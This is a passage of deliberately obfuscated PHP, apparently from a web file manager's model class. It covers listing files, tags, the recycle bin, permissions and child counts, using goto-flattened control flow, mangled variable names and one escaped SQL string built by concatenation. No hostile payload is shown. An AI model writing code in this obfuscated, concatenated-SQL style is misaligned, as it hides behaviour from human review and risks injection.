$B‡éÉñí = array_filter_by_field($dÅ„ä÷Îˆ, $fšÁ†ŒÇÓ¤[389], $CöÄ´°÷®); goto A†ˆ÷‚èÓ; C™Şí‰Ùöà: } private function listUserTagClear($d¿†ïİÎ°, $dÛè´ëåª¹, $aÄ¨¼½¹í’) { goto D­ˆˆ†éó©; DÚŒé§…ù: $FÓñ‡«š¤³ = array(); $f’õñò¹šÛ = array_to_keyvalue($dÛè´ëåª¹[$cù¼Û‰¨Üõ[74]], $cù¼Û‰¨Üõ[33], $cù¼Û‰¨Üõ[365]); $eò¿Åä‚Ã = array_to_keyvalue($dÛè´ëåª¹[$cù¼Û‰¨Üõ[73]], $cù¼Û‰¨Üõ[33], $cù¼Û‰¨Üõ[365]); goto aÏéÔ¶İÉİ; Dª†è ì‚: Model($cù¼Û‰¨Üõ[390])->removeFromTag($FÓñ‡«š¤³, $aÄ¨¼½¹í’); goto bˆì°õ‰®¿; D­ˆˆ†éó©: $cù¼Û‰¨Üõ =& $_SERVER[Ö]; if (!$d¿†ïİÎ°) { return; } if ($dÛè´ëåª¹ && count($d¿†ïİÎ°) == $dÛè´ëåª¹[$cù¼Û‰¨Üõ[347]][$cù¼Û‰¨Üõ[348]]) { return; } goto DÚŒé§…ù; aÏéÔ¶İÉİ: $e…ëÛÄæÃä = array_merge($eò¿Åä‚Ã, $f’õñò¹šÛ); foreach ($d¿†ïİÎ° as $c²¥Ã¨õ›˜) { if (!in_array($c²¥Ã¨õ›˜, $e…ëÛÄæÃä)) { $FÓñ‡«š¤³[] = $c²¥Ã¨õ›˜; } } if (!$FÓñ‡«š¤³) { return; } goto Dª†è ì‚; bˆì°õ‰®¿: } public function listUserRecycle() { $D‡İÄ„†‰™ =& $_SERVER[Ö]; $CØ¾Á¦°’ = Model($D‡İÄ„†‰™[391])->listData(); if (!$CØ¾Á¦°’) { return array(); } $a¤”³Å¶œ© = array($D‡İÄ„†‰™[379] => array($D‡İÄ„†‰™[380], $CØ¾Á¦°’), $D‡İÄ„†‰™[392] => 1); return $this->listSource($a¤”³Å¶œ©); } public function listSource($BéÚ‡‚Û£ã, $D”§Ôï×¿ = 3000) { goto bàß¡†Ê™; Eß¬Ş´¼ç: $bÃ³ù¶ôƒ = $this->field($C­œš–º‰’)->_makeOrder()->where($BéÚ‡‚Û£ã)->selectPage($D”§Ôï×¿); $this->_listDataApply($bÃ³ù¶ôƒ[$eê¡“‘ò‚Á[350]]); $this->_listMake($bÃ³ù¶ôƒ); goto a¥óÙğÉÓÙ; bàß¡†Ê™: $eê¡“‘ò‚Á =& $_SERVER[Ö]; if (!isset($BéÚ‡‚Û£ã[$eê¡“‘ò‚Á[393]])) { $BéÚ‡‚Û£ã[$eê¡“‘ò‚Á[393]] = 0; } $C­œš–º‰’ = $eê¡“‘ò‚Á[394]; goto Eß¬Ş´¼ç; a¥óÙğÉÓÙ: return $bÃ³ù¶ôƒ; goto EšÉ¦ùÌ¯¬; EšÉ¦ùÌ¯¬: } protected function _makeOrder() { goto C´µ„‰¹Å¹; C´µ„‰¹Å¹: $EÜŞ ¶ =& $_SERVER[Ö]; $B„Ğ³•ƒÃ‘ = Model($EÜŞ ¶[395])->get($EÜŞ ¶[396]); $BÄĞ÷’ŠîÉ = Model($EÜŞ ¶[395])->get($EÜŞ ¶[397]); goto a§¿êÀå; b£ĞÎ¶‡ƒ†: $aõ…“³ä— = Input::get($EÜŞ ¶[404], $EÜŞ ¶[7], $BÄĞ÷’ŠîÉ, array_keys($eã“ÊÂŠ¦¯)); if (!in_array($cË‡ÂÁ¼Â“, array_keys($Eæ¦³‚ƒÅÔ))) { $cË‡ÂÁ¼Â“ = $EÜŞ ¶[28]; } if (!in_array($aõ…“³ä—, array_keys($eã“ÊÂŠ¦¯))) { $cË‡ÂÁ¼Â“ = $EÜŞ ¶[398]; } goto EÏ±Ò‡òî; a§¿êÀå: $eã“ÊÂŠ¦¯ = array($EÜŞ ¶[398] => $EÜŞ ¶[399], $EÜŞ ¶[400] => $EÜŞ ¶[401]); $Eæ¦³‚ƒÅÔ = array($EÜŞ ¶[28] => $EÜŞ ¶[28], $EÜŞ ¶[77] => $EÜŞ ¶[77], $EÜŞ ¶[156] => $EÜŞ ¶[368], $EÜŞ ¶[374] => $EÜŞ ¶[374], $EÜŞ ¶[402] => $EÜŞ ¶[375], $EÜŞ ¶[183] => $EÜŞ ¶[183], $EÜŞ ¶[106] => $EÜŞ ¶[106]); $cË‡ÂÁ¼Â“ = Input::get($EÜŞ ¶[403], $EÜŞ ¶[7], $B„Ğ³•ƒÃ‘, array_keys($Eæ¦³‚ƒÅÔ)); goto b£ĞÎ¶‡ƒ†; EÏ±Ò‡òî: if ($cË‡ÂÁ¼Â“ == $EÜŞ ¶[28]) { } $DĞ¥×‰… = $EÜŞ ¶[405] . $Eæ¦³‚ƒÅÔ[$cË‡ÂÁ¼Â“] . $EÜŞ ¶[50] . $eã“ÊÂŠ¦¯[$aõ…“³ä—]; return $this->order(rtrim(trim($DĞ¥×‰…), $EÜŞ ¶[47])); goto CãŞÇ——Û‚; CãŞÇ——Û‚: } protected function _listDataApplyItem($b…é¾›õœ§, $CîŸØßÛµ = false) { $aä‚ª‡Ì»İ = array($b…é¾›õœ§); $this->_listDataApply($aä‚ª‡Ì»İ, $CîŸØßÛµ); return $aä‚ª‡Ì»İ[0]; } protected function _listDataApply(&$b®Á…ÌœŒ±, $Dæòß· = false) { goto AÖãå¿÷; AÖãå¿÷: $b‡‚Óó÷ªæ =& $_SERVER[Ö]; if (!$b®Á…ÌœŒ±) { $b®Á…ÌœŒ± = array(); return; } $a’¼¾Ÿºµ¦ = array_to_keyvalue($b®Á…ÌœŒ±, $b‡‚Óó÷ªæ[33], $b‡‚Óó÷ªæ[365]); goto bìÚêÀ”’°; bÏ£¸óÏĞ: $this->_listAppendPath($b®Á…ÌœŒ±); $this->_listAppendAuth($b®Á…ÌœŒ±); $this->_listAppendSourceInfo($b®Á…ÌœŒ±, $a’¼¾Ÿºµ¦); goto A‚ÊÉ¿Ÿ; bìÚêÀ”’°: $a’¼¾Ÿºµ¦ = array_unique($a’¼¾Ÿºµ¦); $this->_listSourceCache($b®Á…ÌœŒ±); if (!$Dæòß·) { $this->_listAppendMeta($b®Á…ÌœŒ±, $a’¼¾Ÿºµ¦); $this->_listAppendFileMeta($b®Á…ÌœŒ±, $a’¼¾Ÿºµ¦); $this->_listAppendChildren($b®Á…ÌœŒ±, $a’¼¾Ÿºµ¦); } goto bÏ£¸óÏĞ; A‚ÊÉ¿Ÿ: $this->_listAppendUser($b®Á…ÌœŒ±); $this->_listFilterInfo($b®Á…ÌœŒ±, $Dæòß·); goto F–óó«‹Ÿ; F–óó«‹Ÿ: } protected function _listSourceCache($bÄà¬ÓŸÈ) { $d¦ñ‘Œë¬é =& $_SERVER[Ö]; foreach ($bÄà¬ÓŸÈ as $E¼½Şø›ùÚ) { self::$cacheSourceInfo[$d¦ñ‘Œë¬é[406] . $E¼½Şø›ùÚ[$d¦ñ‘Œë¬é[365]]] = $E¼½Şø›ùÚ; } } protected function _listFilterInfo(&$aé³†ÆÒ„¤, $bòÔ–ÙÆ²Ç = false) { $B¢Œò‡˜¦§ =& $_SERVER[Ö]; foreach ($aé³†ÆÒ„¤ as &$EÍ—Á¤­) { $EÍ—Á¤­ = $this->pathInfoFilter($EÍ—Á¤­); self::$cachePathInfo[$B¢Œò‡˜¦§[407] . intval($bòÔ–ÙÆ²Ç) . $B¢Œò‡˜¦§[408] . $EÍ—Á¤­[$B¢Œò‡˜¦§[365]]] = $EÍ—Á¤­; } } protected function _listMake(&$B¬îƒºÎâÒ) { $FÌã„ãà‘­ =& $_SERVER[Ö]; $B¬îƒºÎâÒ[$FÌã„ãà‘­[74]] = array(); $B¬îƒºÎâÒ[$FÌã„ãà‘­[73]] = array(); foreach ($B¬îƒºÎâÒ[$FÌã„ãà‘­[350]] as $FÃÛÅ ¸¬¬) { $bî×¨·ƒ”¯ = $FÃÛÅ ¸¬¬[$FÌã„ãà‘­[366]] == 1 ? $FÌã„ãà‘­[74] : $FÌã„ãà‘­[73]; $B¬îƒºÎâÒ[$bî×¨·ƒ”¯][] = $FÃÛÅ ¸¬¬; } unset($B¬îƒºÎâÒ[$FÌã„ãà‘­[350]]); } protected function _listAppendMeta(&$CŞ®©Œöæß, $DóÀøÊˆ·æ) { goto f¨™êµ‘„Ÿ; cÀÏ‘›Â¤: foreach ($DÍ‘½±äÑ¶ as $Eª…ÓŠÍº­) { if (!isset($cóâÈã§¸[$Eª…ÓŠÍº­[$EÈ–ç•ø˜Û[365]]])) { $cóâÈã§¸[$Eª…ÓŠÍº­[$EÈ–ç•ø˜Û[365]]] = array(); } if (in_array($Eª…ÓŠÍº­[$EÈ–ç•ø˜Û[89]], $b¹Ü«ôáî)) { continue; } $cóâÈã§¸[$Eª…ÓŠÍº­[$EÈ–ç•ø˜Û[365]]][$Eª…ÓŠÍº­[$EÈ–ç•ø˜Û[89]]] = $Eª…ÓŠÍº­[$EÈ–ç•ø˜Û[355]]; } foreach ($CŞ®©Œöæß as &$E‹¸½¤¯‡ï) { $E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[413]] = !1; if (isset($cóâÈã§¸[$E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[365]]])) { $E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[413]] = $cóâÈã§¸[$E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[365]]]; } if ($this->fileIsLock($E‹¸½¤¯‡ï) && $E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[372]]) { $B£§ğ¬ÓÑ– = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[372]][$EÈ–ç•ø˜Û[373]] = AuthModel::authDisable($E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[372]][$EÈ–ç•ø˜Û[373]], $B£§ğ¬ÓÑ–); $E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[372]][$EÈ–ç•ø˜Û[414]][$EÈ–ç•ø˜Û[372]] = $E‹¸½¤¯‡ï[$EÈ–ç•ø˜Û[372]][$EÈ–ç•ø˜Û[373]]; } } goto E‡®ì¾‰„¾; f¨™êµ‘„Ÿ: $EÈ–ç•ø˜Û =& $_SERVER[Ö]; $FŒØ‚ªô¢ƒ = array($EÈ–ç•ø˜Û[379] => array($EÈ–ç•ø˜Û[380], $DóÀøÊˆ·æ)); $DÍ‘½±äÑ¶ = Model($EÈ–ç•ø˜Û[409])->field($EÈ–ç•ø˜Û[410])->where($FŒØ‚ªô¢ƒ)->select(); goto D¨ø½Ú‘ÅÓ; D¨ø½Ú‘ÅÓ: if (!$DÍ‘½±äÑ¶) { return; } $b¹Ü«ôáî = array($EÈ–ç•ø˜Û[411], $EÈ–ç•ø˜Û[412]); $cóâÈã§¸ = array(); goto cÀÏ‘›Â¤; E‡®ì¾‰„¾: } protected function _listAppendFileMeta(&$bÛ¤Ùƒ®Ş, $aèÇ¥‹‡Øˆ) { goto F‘é¦¢Ÿğ; E÷¼ØÜÆŒé: if (!$DùÑñÅ´å) { return; } $Bµ¶¹µ„ì = array($B–à¶¨ÀèÅ[416] => array($B–à¶¨ÀèÅ[380], $DùÑñÅ´å)); $fŸ—¡ÔÉ»ó = $B–à¶¨ÀèÅ[417]; goto AÅÒ‚ŞºÄ; F‘é¦¢Ÿğ: $B–à¶¨ÀèÅ =& $_SERVER[Ö]; $DùÑñÅ´å = array_to_keyvalue($bÛ¤Ùƒ®Ş, $B–à¶¨ÀèÅ[33], $B–à¶¨ÀèÅ[415]); $DùÑñÅ´å = array_filter(array_unique($DùÑñÅ´å)); goto E÷¼ØÜÆŒé; AÅÒ‚ŞºÄ: $a¡Ğ·‚ÇÀ¶ = Model($B–à¶¨ÀèÅ[418])->field($fŸ—¡ÔÉ»ó)->where($Bµ¶¹µ„ì)->select(); $a¡Ğ·‚ÇÀ¶ = array_to_keyvalue($a¡Ğ·‚ÇÀ¶, $B–à¶¨ÀèÅ[415]); $A‚„§²’ğ« = Model($B–à¶¨ÀèÅ[419])->field($B–à¶¨ÀèÅ[420])->where($Bµ¶¹µ„ì)->select(); goto e‹ÙÎïÄš‚; e‹ÙÎïÄš‚: $A‚„§²’ğ« = $A‚„§²’ğ« ? $A‚„§²’ğ« : array(); $B±åÍŸãñê = array(); foreach ($A‚„§²’ğ« as $dŠÑ¯¿‰Ø„) { if (!isset($B±åÍŸãñê[$dŠÑ¯¿‰Ø„[$B–à¶¨ÀèÅ[415]]])) { $B±åÍŸãñê[$dŠÑ¯¿‰Ø„[$B–à¶¨ÀèÅ[415]]] = array(); } $B±åÍŸãñê[$dŠÑ¯¿‰Ø„[$B–à¶¨ÀèÅ[415]]][$dŠÑ¯¿‰Ø„[$B–à¶¨ÀèÅ[89]]] = $dŠÑ¯¿‰Ø„[$B–à¶¨ÀèÅ[355]]; } goto b„ÙŞÉŒ; b„ÙŞÉŒ: foreach ($bÛ¤Ùƒ®Ş as &$e©ÑÌ®åà) { goto Céİ¶°ÉÍ; bÛ­„˜‰İ: $E‘¼ÂÁìğô[$B–à¶¨ÀèÅ[77]] = $e©ÑÌ®åà[$B–à¶¨ÀèÅ[77]]; $E‘¼ÂÁìğô[$B–à¶¨ÀèÅ[28]] = $e©ÑÌ®åà[$B–à¶¨ÀèÅ[28]]; self::$cacheFileInfo[$B–à¶¨ÀèÅ[421] . $A·©Œ£¨Ã] = $E‘¼ÂÁìğô; goto A§§–¾ÌÅ†; AòÓçÒÓÏÅ: if (isset($e©ÑÌ®åà[$B–à¶¨ÀèÅ[158]][$B–à¶¨ÀèÅ[422]])) { $e©ÑÌ®åà[$B–à¶¨ÀèÅ[422]] = json_decode($e©ÑÌ®åà[$B–à¶¨ÀèÅ[158]][$B–à¶¨ÀèÅ[422]], !0); unset($e©ÑÌ®åà[$B–à¶¨ÀèÅ[158]][$B–à¶¨ÀèÅ[422]]); } goto F—¾ÆÁ‹Ğ; A§§–¾ÌÅ†: unset($a¡Ğ·‚ÇÀ¶[$A·©Œ£¨Ã][$B–à¶¨ÀèÅ[75]]); $bÏÌ…ƒôçé = is_array($B±åÍŸãñê[$A·©Œ£¨Ã]) ? $B±åÍŸãñê[$A·©Œ£¨Ã] : array(); $e©ÑÌ®åà[$B–à¶¨ÀèÅ[158]] = array_merge($bÏÌ…ƒôçé, $a¡Ğ·‚ÇÀ¶[$A·©Œ£¨Ã]); goto AòÓçÒÓÏÅ; Céİ¶°ÉÍ: $A·©Œ£¨Ã = $e©ÑÌ®åà[$B–à¶¨ÀèÅ[415]]; if (!$A·©Œ£¨Ã || !isset($a¡Ğ·‚ÇÀ¶[$A·©Œ£¨Ã])) { continue; } $E‘¼ÂÁìğô = $a¡Ğ·‚ÇÀ¶[$A·©Œ£¨Ã]; goto bÛ­„˜‰İ; F—¾ÆÁ‹Ğ: } goto Dß÷¥¯”Êá; Dß÷¥¯”Êá: } protected function _listAppendSourceInfo(&$Eé˜àÜã·–, $E‚”·öë¢) { goto FÌŞìÊ¸Ü©; bÄ¥Œê“§¼: $CÒòÄ®ö…– = array_to_keyvalue_group($BôŞƒóÑˆ‚, $BïƒÉÓÕ‘[365]); foreach ($Eé˜àÜã·– as &$fØºÒÏêù) { $fØºÒÏêù[$BïƒÉÓÕ‘[387]] = array($BïƒÉÓÕ‘[426] => 0, $BïƒÉÓÕ‘[427] => 0, $BïƒÉÓÕ‘[428] => 0); if (isset($BÜñ×œäÑ[$fØºÒÏêù[$BïƒÉÓÕ‘[365]]])) { $fØºÒÏêù[$BïƒÉÓÕ‘[387]][$BïƒÉÓÕ‘[429]] = 1; $fØºÒÏêù[$BïƒÉÓÕ‘[387]][$BïƒÉÓÕ‘[430]] = $BÜñ×œäÑ[$fØºÒÏêù[$BïƒÉÓÕ‘[365]]][$BïƒÉÓÕ‘[28]]; } if (isset($Cí§º†…Â…[$fØºÒÏêù[$BïƒÉÓÕ‘[365]]])) { $fØºÒÏêù[$BïƒÉÓÕ‘[387]][$BïƒÉÓÕ‘[431]] = array(); foreach ($Cí§º†…Â…[$fØºÒÏêù[$BïƒÉÓÕ‘[365]]] as $aª»‡¹ï) { $B¬³´¼íÆè = $C„Ö´ºŒî½[$aª»‡¹ï]; $fØºÒÏêù[$BïƒÉÓÕ‘[387]][$BïƒÉÓÕ‘[431]][] = array($BïƒÉÓÕ‘[432] => $B¬³´¼íÆè[$BïƒÉÓÕ‘[363]], $BïƒÉÓÕ‘[382] => $B¬³´¼íÆè[$BïƒÉÓÕ‘[28]], $BïƒÉÓÕ‘[433] => $B¬³´¼íÆè[$BïƒÉÓÕ‘[434]]); } } if (isset($CÒòÄ®ö…–[$fØºÒÏêù[$BïƒÉÓÕ‘[365]]])) { $fØºÒÏêù[$BïƒÉÓÕ‘[387]][$BïƒÉÓÕ‘[435]] = array(); foreach ($CÒòÄ®ö…–[$fØºÒÏêù[$BïƒÉÓÕ‘[365]]] as $B¡Í  Ÿª) { $fØºÒÏêù[$BïƒÉÓÕ‘[387]][$BïƒÉÓÕ‘[435]] = array($BïƒÉÓÕ‘[436] => $B¡Í  Ÿª[$BïƒÉÓÕ‘[437]], $BïƒÉÓÕ‘[438] => $B¡Í  Ÿª[$BïƒÉÓÕ‘[439]], $BïƒÉÓÕ‘[440] => $B¡Í  Ÿª[$BïƒÉÓÕ‘[365]], $BïƒÉÓÕ‘[441] => $B¡Í  Ÿª[$BïƒÉÓÕ‘[442]], $BïƒÉÓÕ‘[443] => $B¡Í  Ÿª[$BïƒÉÓÕ‘[444]]); } } } return $Eé˜àÜã·–; goto B‘¥«‚×Õ¡; FÌŞìÊ¸Ü©: $BïƒÉÓÕ‘ =& $_SERVER[Ö]; if (!defined($BïƒÉÓÕ‘[423])) { return; } $E’õ“î³á = Model($BïƒÉÓÕ‘[424])->listData(); goto e§ÉĞëâ; e§ÉĞëâ: $d“¼°Õ©¹ì = Model($BïƒÉÓÕ‘[388])->listData(); $F³ªµîçÓ” = Model($BïƒÉÓÕ‘[377])->listData(); $BôŞƒóÑˆ‚ = Model($BïƒÉÓÕ‘[425])->listSimple(); goto Aõ´„éßƒ›; Aõ´„éßƒ›: $C„Ö´ºŒî½ = array_to_keyvalue($E’õ“î³á, $BïƒÉÓÕ‘[363]); $Cí§º†…Â… = array_to_keyvalue_group($d“¼°Õ©¹ì, $BïƒÉÓÕ‘[75], $BïƒÉÓÕ‘[389]); $BÜñ×œäÑ = array_to_keyvalue($F³ªµîçÓ”, $BïƒÉÓÕ‘[75]); goto bÄ¥Œê“§¼; B‘¥«‚×Õ¡: } protected function _listAppendChildren(&$cÃ˜½ùÊÑµ, $C¡ÙŸ‚Â) { goto FÉá¦…‹°á; AÙ‰Ç£ŸÒâ: $a¨ÑæÓ‘¦ = $this->tablePrefix . $this->tableName; for ($B¾”«ôˆØí = 0; $B¾”«ôˆØí < $fÍ×…ŒŠŠ„; $B¾”«ôˆØí++) { $eáÀÕÆ÷” = intval($cÃ˜½ùÊÑµ[$B¾”«ôˆØí][$Bëš…ï­Ğ[393]]); if ($cÃ˜½ùÊÑµ[$B¾”«ôˆØí][$Bëš…ï­Ğ[366]]) { $A³ÕÇ³À® = $cÃ˜½ùÊÑµ[$B¾”«ôˆØí][$Bëš…ï­Ğ[365]]; $dÓ¶½ ‹›è .= "\x53\x45\114\105\103\x54\40\x2a\40\x46\x52\x4f\x4d\40\50\123\105\x4c\x45\x43\124\40\47{$A³ÕÇ³À®}\x5f\x68\x61\163\106\x69\154\x65\47\40\x61\163\40\x68\141\163\54\143\157\x75\x6e\x74\50\x31\51\x20\141\x73\x20\x68\141\163\x43\x6f\x75\156\164\40\106\122\117\115\x20\x60{$a¨ÑæÓ‘¦}\140\x20\xa\11\x9\x9\11\11\x77\x68\x65\x72\145\40\160\141\x72\145\x6e\x74\111\104\75{$A³ÕÇ³À®}\x20\141\x6e\144\x20\151\163\106\x6f\x6c\x64\145\x72\75\x30\x20\x61\x6e\144\40\151\163\x44\x65\x6c\x65\164\145\x3d{$eáÀÕÆ÷”}\51\40\141\x73\x20\x74\142\61\x5f{$A³ÕÇ³À®}\40\165\156\x69\x6f\156\x20\x61\154\154\40\12\x9\x9\11\11\x9\x53\x45\114\x45\103\x54\40\x2a\x20\x46\122\x4f\115\40\x28\123\x45\x4c\105\103\x54\x20\x27{$A³ÕÇ³À®}\137\x68\141\x73\106\157\x6c\144\x65\x72\47\x20\x61\163\x20\150\x61\x73\x46\x69\x6c\145\54\x63\157\165\x6e\x74\50\61\x29\x20\141\163\x20\x68\141\163\x43\x6f\x75\x6e\164\x20\x46\122\x4f\115\x20\x60{$a¨ÑæÓ‘¦}\140\40\12\11\x9\x9\11\11\167\150\x65\x72\x65\40\x70\x61\162\145\x6e\x74\x49\x44\75{$A³ÕÇ³À®}\40\x61\x6e\x64\40\151\x73\106\157\x6c\144\145\x72\x3d\61\x20\141\156\144\40\151\x73\x44\145\154\145\x74\145\75{$eáÀÕÆ÷”}\x29\40\x61\163\x20\x74\x62\x32\x5f{$A³ÕÇ³À®}\40\x75\x6e\151\157\x6e\40\141\154\154\40"; } if ((strlen($dÓ¶½ ‹›è) >= $cŠ™À›™£ô || $B¾”«ôˆØí == $fÍ×…ŒŠŠ„ - 1) && $dÓ¶½ ‹›è) { $dÓ¶½ ‹›è = substr($dÓ¶½ ‹›è, 0, -strlen($Bëš…ï­Ğ[445])); $a©½„ĞçÉ± = $this->query($dÓ¶½ ‹›è); $F»•ÍŠ»· = array_merge($F»•ÍŠ»·, $a©½„ĞçÉ±); $dÓ¶½ ‹›è = $Bëš…ï­Ğ[33]; } } $F»•ÍŠ»· = array_to_keyvalue($F»•ÍŠ»·, $Bëš…ï­Ğ[446]); goto A»Í›áÎÖŸ; A»Í›áÎÖŸ: foreach ($cÃ˜½ùÊÑµ as &$f¥ãğÙ¡Ü) { if ($f¥ãğÙ¡Ü[$Bëš…ï­Ğ[366]]) { unset($f¥ãğÙ¡Ü[$Bëš…ï­Ğ[368]]); $f¥ãğÙ¡Ü[$Bëš…ï­Ğ[188]] = intval($F»•ÍŠ»·[$f¥ãğÙ¡Ü[$Bëš…ï­Ğ[365]] . $Bëš…ï­Ğ[447]][$Bëš…ï­Ğ[448]]); $f¥ãğÙ¡Ü[$Bëš…ï­Ğ[187]] = intval($F»•ÍŠ»·[$f¥ãğÙ¡Ü[$Bëš…ï­Ğ[365]] . $Bëš…ï­Ğ[449]][$Bëš…ï­Ğ[448]]); } } goto B¬È âäÒÚ; FÉá¦…‹°á: $Bëš…ï­Ğ =& $_SERVER[Ö]; $dÓ¶½ ‹›è = $Bëš…ï­Ğ[357]; $F»•ÍŠ»· = array(); goto FîœŒõ¨Æº; FîœŒõ¨Æº: $cŠ™À›™£ô = 1024 * 50; $cÃ˜½ùÊÑµ = is_array($cÃ˜½ùÊÑµ) ? $cÃ˜½ùÊÑµ : array(); $fÍ×…ŒŠŠ„ = count($cÃ˜½ùÊÑµ); goto AÙ‰Ç£ŸÒâ; B¬È âäÒÚ: } protected function _listAppendAuth(&$aÙ™âê±±) { goto CŸÖšÔĞŠ; D«ŞíÎÌÏÑ: foreach ($aÙ™âê±± as $Aâ·¸ÊÎÔí) { if ($Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[367]] == self::TYPE_GROUP) { $aªå¡òæ†Ø[] = $Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[365]]; } } if (!$aªå¡òæ†Ø) { return; } $FÏÌÑÃ¥‰ = array_to_keyvalue($aÙ™âê±±, $bµ‚Ë¾‚ï[365]); goto cÄ§¯Ø½¶Á; cÄ§¯Ø½¶Á: $Aá‹‰…Ş‚÷ = Model($bµ‚Ë¾‚ï[450])->getSourceList($aªå¡òæ†Ø, $FÏÌÑÃ¥‰); foreach ($aÙ™âê±± as $D‹‰Şº†‡ => &$Aâ·¸ÊÎÔí) { $Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[372]] = $Aá‹‰…Ş‚÷[$Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[365]]]; if (!$Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[372]] && $Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[367]] == self::TYPE_GROUP) { $Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[372]] = Action($bµ‚Ë¾‚ï[451])->pathGroupAuthMake($Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[452]]); if (!$Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[372]] && !_get($GLOBALS, $bµ‚Ë¾‚ï[453])) { $Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[185]] = !1; $Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[184]] = !1; } } if ($Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[372]]) { $Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[185]] = AuthModel::authCheckEdit($Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[372]][$bµ‚Ë¾‚ï[373]]); $Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[184]] = AuthModel::authCheckView($Aâ·¸ÊÎÔí[$bµ‚Ë¾‚ï[372]][$bµ‚Ë¾‚ï[373]]); } $this->groupPathDisplay($Aâ·¸ÊÎÔí); } goto F¦öø³Åø’; CŸÖšÔĞŠ: $bµ‚Ë¾‚ï =& $_SERVER[Ö]; if (!defined($bµ‚Ë¾‚ï[423])) { return; } $aªå¡òæ†Ø = array(); goto D«ŞíÎÌÏÑ; F¦öø³Åø’: } public function groupPathDisplay(&$FÙ»ôã¾©˜) { goto e…¨®Š”Íñ; e…¨®Š”Íñ: $eí‰¦Ä =& $_SERVER[Ö]; if ($FÙ»ôã¾©˜[$eí‰¦Ä[367]] != self::TYPE_GROUP) { return; } $b‡îĞ·‹ª = Model($eí‰¦Ä[454])->getInfo($FÙ»ôã¾©˜[$eí‰¦Ä[452]]); goto bÀÃï—Á; E¬É«ƒˆïÔ: $FÙ»ôã¾©˜[$eí‰¦Ä[456]] = $b‡îĞ·‹ª[$eí‰¦Ä[457]]; $FÙ»ôã¾©˜[$eí‰¦Ä[376]] = $b‡îĞ·‹ª[$eí‰¦Ä[455]]; $FÙ»ôã¾©˜[$eí‰¦Ä[458]] = $b‡îĞ·‹ª[$eí‰¦Ä[459]]; goto A¢°Éñëïµ; A¢°Éñëïµ: $FÙ»ôã¾©˜[$eí‰¦Ä[460]] = $B¢‘¬„ÇÇø . $b‡îĞ·‹ª[$eí‰¦Ä[387]][$eí‰¦Ä[365]]; goto E¦¯•šÕŞÜ; bÀÃï—Á: $cç¡ƒ²‚³ = $this->parentLevelArray($b‡îĞ·‹ª[$eí‰¦Ä[455]]); $B¢‘¬„ÇÇø = $eí‰¦Ä[33]; foreach ($cç¡ƒ²‚³ as $A¼µŠŒÛÃ) { $CÑ•œÕß“ = Model($eí‰¦Ä[454])->getInfo($A¼µŠŒÛÃ); $B¢‘¬„ÇÇø .= $CÑ•œÕß“[$eí‰¦Ä[387]][$eí‰¦Ä[365]] . $eí‰¦Ä[47]; } goto E¬É«ƒˆïÔ; E¦¯•šÕŞÜ: } protected function _listAppendPath(&$A„ã¦íà) { goto d…Õ­³ãŞ; Fó‘‘‹•: $E²æ­¯«‹ = array(); foreach ($E©Ëõ¦Ë¡ as $eŞìªùä¹… => $aÙåë•‰ù“) { if (!$aÙåë•‰ù“) { $E²æ­¯«‹[] = $eŞìªùä¹…; } } if ($E²æ­¯«‹) { $D­ïà—ó´ë = array($Aâ«ô’‘Ş­[379] => array($Aâ«ô’‘Ş­[380], $E²æ­¯«‹)); if (count($E²æ­¯«‹) == 1) { $Eáï‰Œ«Ú = $this->sourceInfo($E²æ­¯«‹[0]); $Eáï‰Œ«Ú = is_array($Eáï‰Œ«Ú) ? array($Eáï‰Œ«Ú) : !1; } else { $Eáï‰Œ«Ú = $this->field($Aâ«ô’‘Ş­[461])->where($D­ïà—ó´ë)->select(); } $DŒ¡‚„ÇÖ‘ = array_to_keyvalue($Eáï‰Œ«Ú, $Aâ«ô’‘Ş­[365], $Aâ«ô’‘Ş­[28]); $E©Ëõ¦Ë¡ = array_merge_index($E©Ëõ¦Ë¡, $DŒ¡‚„ÇÖ‘); } goto cÑÑ‘£¾¡Ì; cÑÑ‘£¾¡Ì: $Fé®êªšØ‹ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($A„ã¦íà as &$E“™¥ä•ß) { goto b¡Óó­ñÒ; A²‘«Äª‘: if ($A®×™î”µ˜) { $AƒÈ®ñºÍ .= $E“™¥ä•ß[$Aâ«ô’‘Ş­[28]]; } if ($E“™¥ä•ß[$Aâ«ô’‘Ş­[366]]) { $AƒÈ®ñºÍ .= $Aâ«ô’‘Ş­[8]; } $E“™¥ä•ß[$Aâ«ô’‘Ş­[462]] = str_replace($Aâ«ô’‘Ş­[463], $Aâ«ô’‘Ş­[8], $AƒÈ®ñºÍ); goto Bğ‡µí¶±¤; Bğ‡µí¶±¤: $cŠ‚°æº›ˆ = trim($E“™¥ä•ß[$Aâ«ô’‘Ş­[462]], $Aâ«ô’‘Ş­[8]); if ($E“™¥ä•ß[$Aâ«ô’‘Ş­[457]] == $Aâ«ô’‘Ş­[464] && $cŠ‚°æº›ˆ) { $E“™¥ä•ß[$Aâ«ô’‘Ş­[28]] = $cŠ‚°æº›ˆ; } $this->_listAppendPathRecycle($E“™¥ä•ß, $A®×™î”µ˜, $Fé®êªšØ‹); goto F«Ô¹’Ú‹Ä; b¡Óó­ñÒ: $A®×™î”µ˜ = 